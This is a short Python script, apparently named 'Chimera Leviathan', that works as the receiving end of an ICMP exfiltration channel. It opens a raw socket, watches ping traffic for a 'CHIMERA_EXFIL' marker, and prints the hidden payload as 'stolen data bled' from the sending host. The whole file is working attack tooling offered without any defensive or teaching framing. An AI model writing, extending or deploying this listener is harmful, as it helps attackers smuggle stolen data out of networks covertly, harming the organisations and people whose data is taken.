import socket

def start_sniffer():
    print("[+] Chimera Leviathan: Passive ICMP Sniffer Active...")
    
    # Create raw socket to listen for ICMP packets
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind(("0.0.0.0", 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        packet, addr = s.recvfrom(65535)
        # Check if our secret header is inside the packet
        if b"CHIMERA_EXFIL" in packet:
            # Extract and decode the payload
            idx = packet.find(b"CHIMERA_EXFIL")
            stolen_data = packet[idx:].decode('utf-8', 'ignore').strip('\x00')
            print(f"\n[!] DATA BLED FROM {addr[0]}:")
            print(f"    --> {stolen_data}")

if __name__ == "__main__":
    start_sniffer()
